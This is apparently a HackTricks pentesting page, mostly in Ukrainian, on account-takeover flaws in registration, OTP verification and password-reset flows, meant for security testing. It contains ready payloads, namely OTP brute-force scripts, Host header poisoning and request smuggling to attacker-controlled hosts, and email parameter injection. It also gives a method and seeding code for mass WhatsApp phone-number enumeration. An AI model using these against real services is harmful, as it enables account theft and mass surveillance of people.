# Вразливості реєстрації та takeover

{{#include ../banners/hacktricks-training.md}}

## Registration Takeover

### Подвійна реєстрація

- Спробуйте створити акаунт з існуючим іменем користувача
- Спробуйте варіювати email:
- великі літери (uppercase)
- +1@
- додати крапку в email
- спеціальні символи в локальній частині email (%00, %09, %20)
- Додати пробільні символи після email: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Спробуйте трюки каноналізації адреси поштового провайдера (залежить від сервісу):
- Gmail ігнорує крапки та subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` доставляються до `victim@gmail.com`
- Деякі провайдери нечутливі до регістру в локальній частині
- Деякі провайдери приймають unicode confusables. Спробуйте гомогліфи та soft hyphen `\u00AD` у локальній частині
- Зловживання цим дозволяє: обійти перевірки унікальності, отримати дублікати акаунтів/workspace запрошень, або заблокувати реєстрації жертви (тимчасовий DoS) поки ви готуєте takeover

### Username Enumeration

Перевірте, чи можна визначити, коли ім'я користувача вже зареєстроване в додатку.

- Різні повідомлення про помилку або HTTP статус-коди
- Різниця в таймінгу (існуючий користувач може спричиняти пошук в IdP/DB)
- Автозаповнення форми реєстрації даними профілю для відомих email
- Перевірте team/invite потоки: введення email може показати, чи існує акаунт

### Password Policy

При створенні користувача перевірте політику паролів (чи можна використовувати слабкі паролі).\
У такому випадку ви можете спробувати bruteforce підбір облікових даних.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement) щоб дізнатися, як спробувати takeover акаунтів або витягти інформацію через **SQL Injections** у формах реєстрації.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### Change Email

Після реєстрації спробуйте змінити email і перевірте, чи ця зміна правильно валідується або чи можна змінити її на довільну адресу.

### More Checks

- Перевірте, чи можна використовувати **disposable emails** (mailinator, yopmail, 1secmail, etc.) або обійти блоклист через subaddressing як `victim+mailinator@gmail.com`
- **Long** **password** (>200) призводить до **DoS**
- **Check rate limits on account creation**
- Використайте username@**burp_collab**.net та проаналізуйте **callback**
- Якщо використовується верифікація по телефону, перевірте крайові випадки парсингу/ін'єкцій у телефонних номерах

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Phone-number–centric messengers expose a **presence oracle** whenever the client syncs contacts. Replaying WhatsApp’s discovery requests historically delivered **>100M lookups per hour**, enabling near-complete account enumerations.

**Attack workflow**

1. **Instrument an official client** to capture the address-book upload request (authenticated blob of normalized E.164 numbers). Replay it with attacker-generated numbers while reusing the same cookies/device token.
2. **Batch numbers per request**: WhatsApp accepts thousands of identifiers and returns registered/unregistered plus metadata (business, companion, etc.). Analyze responses offline to build target lists without messaging victims.
3. **Horizontally scale** enumeration with SIM banks, cloud devices, or residential proxies so per-account/IP/ASN throttling never triggers.

**Dialing-plan modeling**

Model each country’s dialing plan to skip invalid candidates. The NDSS dataset (`country-table.*`) lists country codes, adoption density, and platform split so you can prioritize high-hit ranges. Example seeding code:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Пріоритезуйте префікси, що збігаються з реальними алокаціями (Mobile Country Code + National Destination Code), перед запитами до oracle, щоб зберегти корисну пропускну здатність.

**Перетворення enumerations у цілеспрямовані атаки**

- Передавайте leaked телефонні номери (наприклад, Facebook’s 2021 breach) в oracle, щоб дізнатися, які ідентичності все ще активні перед phishing, SIM-swapping або spamming.
- Slice censuses за країною/OS/типом додатку, щоб знайти регіони з слабкою фільтрацією SMS або широким використанням WhatsApp Business для локалізованого social engineering.

**Кореляція повторного використання public-key**

WhatsApp розкриває X25519 identity key кожного облікового запису під час встановлення сесії. Запитуйте identity material для кожного enumerated номера і дедуплікуйте public keys, щоб виявити account farms, cloned clients або небезпечне firmware — shared keys дозволяють deanonymize multi-SIM операції.

## Слабка перевірка Email/Phone (OTP/Magic Link)

Реєстраційні потоки часто перевіряють право власності за допомогою числового OTP або magic-link токена. Типові вразливості:

- Передбачуваний або короткий OTP (4–6 цифр) без ефективного rate limiting або IP/device tracking. Спробуйте паралельні здогади та ротацію header/IP.
- Повторне використання OTP між діями або обліковими записами, або прив’язка не до конкретного користувача/дії (наприклад, той самий код працює для login і signup, або працює після зміни email).
- Multi-value smuggling: деякі бекенди приймають кілька кодів і перевіряють, чи якийсь співпадає. Спробуйте:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Comma/pipe separated values: `code=000000,123456` or `code=000000|123456`
- Response oracle: відрізняйте wrong vs expired vs wrong-user коди за статусом/повідомленням/довжиною тіла.
- Токени не скидаються після успіху або після зміни пароля/email.
- Verification token не прив’язаний до user agent/IP, що дозволяє завершення перевірки cross-origin з attacker-controlled сторінок.

Приклад bruteforcing з ffuf проти JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Паралельне/конкурентне вгадування для обходу послідовних блокувань (використовуйте Turbo Intruder у Burp):

<details>
<summary>Фрагмент Turbo Intruder для масової відправки спроб 6‑значних OTP</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: submit the same valid OTP simultaneously in two sessions; sometimes one session becomes a verified attacker account while the victim flow also succeeds.
- Також протестуйте Host header poisoning на верифікаційних посиланнях (так само як reset poisoning нижче), щоб leak або завершити верифікацію на хості, контрольованому зловмисником.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (перед тим, як жертва реєструється)

Сильний клас проблем виникає, коли зловмисник виконує дії з email жертви до того, як жертва створить акаунт, а потім пізніше відновлює доступ.

Ключові техніки для тестування (адаптуйте до потоків цілі):

- Classic–Federated Merge
- Зловмисник: реєструє classic акаунт з email жертви та встановлює пароль
- Жертва: пізніше реєструється через SSO (той самий email)
- Небезпечні merge-и можуть залишити обидві сторони залогіненими або відновити доступ зловмисника
- Unexpired Session Identifier
- Зловмисник: створює акаунт і тримає довготривалу сесію (не виходити)
- Жертва: відновлює/встановлює пароль і починає користуватися акаунтом
- Перевірте, чи старі сесії залишаються дійсними після reset або увімкнення MFA
- Trojan Identifier
- Зловмисник: додає вторинний ідентифікатор до попередньо створеного акаунта (phone, додатковий email або прив’язує свій IdP)
- Жертва: скидає пароль; зловмисник пізніше використовує trojan identifier для скидання/входу
- Unexpired Email Change
- Зловмисник: ініціює email‑change на attacker mail і затримує підтвердження
- Жертва: відновлює акаунт і починає його використовувати
- Зловмисник: пізніше завершує очікувану email‑change, щоб вкрасти акаунт
- Non‑Verifying IdP
- Зловмисник: використовує IdP, який не перевіряє володіння email, щоб вказати `victim@…`
- Жертва: реєструється класичним шляхом
- Сервіс зливає по email без перевірки `email_verified` або локальної верифікації

Практичні поради

- Збирайте flows та endpoints з web/mobile бандлів. Шукайте classic signup, SSO linking, email/phone change та password reset endpoints.
- Створіть реалістичну автоматизацію, щоб тримати сесії живими, поки ви тестуєте інші потоки.
- Для SSO тестів підніміть тестовий OIDC provider і видайте токени з `email` claim-ами для адреси жертви та `email_verified=false`, щоб перевірити, чи RP довіряє неперевіреним IdP.
- Після будь‑якого password reset або email change перевірте, що:
  - всі інші сесії та токени були зневажені,
  - можливості pending email/phone change були скасовані,
  - раніше прив’язані IdPs/emails/phones перевіряються повторно.

Note: Extensive methodology and case studies of these techniques are documented by Microsoft’s pre‑hijacking research (see References at the end).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Атакуючий повинен увійти у свій обліковий запис і перейти до функції **Change password**.
2. Запустіть Burp Suite і перехопіть запит
3. Надішліть його в вкладку repeater і змініть параметри : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Weak Password Reset Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Токен скидання пароля повинен генеруватися випадково і бути унікальним щоразу.\
Спробуйте визначити, чи токен підлягає закінченню терміну дії або чи він завжди однаковий; в деяких випадках алгоритм генерації слабкий і може бути вгаданий. Алгоритм може використовувати наступні змінні.

- Timestamp
- UserID
- Email of User
- Firstname and Lastname
- Date of Birth
- Cryptography
- Number only
- Small token sequence ( characters between \[A-Z,a-z,0-9])
- Token reuse
- Token expiration date

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Спровокуйте запит на скидання пароля через API/UI для конкретного email, наприклад: test@mail.com
2. Перевірте відповідь сервера і знайдіть `resetToken`
3. Потім використайте токен в URL, наприклад `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Password Reset Via Username Collision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Зареєструйтеся в системі з username, ідентичним імені жертви, але з пробілами, вставленими перед і/або після імені. e.g: `"admin "`
2. Запитайте скидання пароля для вашого зловмисного username.
3. Використайте токен, надісланий на вашу електронну пошту, та скиньте пароль жертви.
4. Увійдіть в обліковий запис жертви з новим паролем.

Платформа CTFd була вразлива до цієї атаки.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account Takeover Via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Знайдіть XSS в додатку або на субдомені, якщо cookies мають область дії на батьківський домен : `*.domain.com`
2. Leak the current **sessions cookie**
3. Аутентифікуйтесь як користувач, використовуючи cookie

### Account Takeover Via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Використайте **smuggler** для визначення типу HTTP Request Smuggling (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Скрафтіть запит, який перезапише `POST / HTTP/1.1` наступними даними:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` з метою відкрити редирект жертв на burpcollab та вкрасти їхні cookies\
3. Фінальний запит може виглядати наступним чином
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone reports exploiting this bug\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Захоплення облікового запису через CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Створіть payload для CSRF, наприклад: “HTML form with auto submit for a password change”
2. Відправте payload

### Захоплення облікового запису через JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token може використовуватися для автентифікації користувача.

- Змініть JWT, підставивши інший User ID / Email
- Перевірте на слабкий підпис JWT


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Реєстрація-як-скидання (Upsert on Existing Email)

Деякі обробники реєстрації виконують upsert, коли вказаний email вже існує. Якщо endpoint приймає мінімальне тіло з email і password і не вимагає перевірки володіння, відправлення email жертви перезапише її password до аутентифікації.

- Виявлення: збирайте імена endpoint з bundled JS (або трафіку mobile app), потім fuzz-те базові шляхи, наприклад /parents/application/v4/admin/FUZZ за допомогою ffuf/dirsearch.
- Підказки щодо методу: GET, який повертає повідомлення типу "Only POST request is allowed.", часто вказує на правильний HTTP-верб і на те, що очікується JSON body.
- Мінімальне тіло, виявлене в реальних умовах:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Приклад PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Вплив: Full Account Takeover (ATO) without any reset token, OTP, or email verification.

## Посилання

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
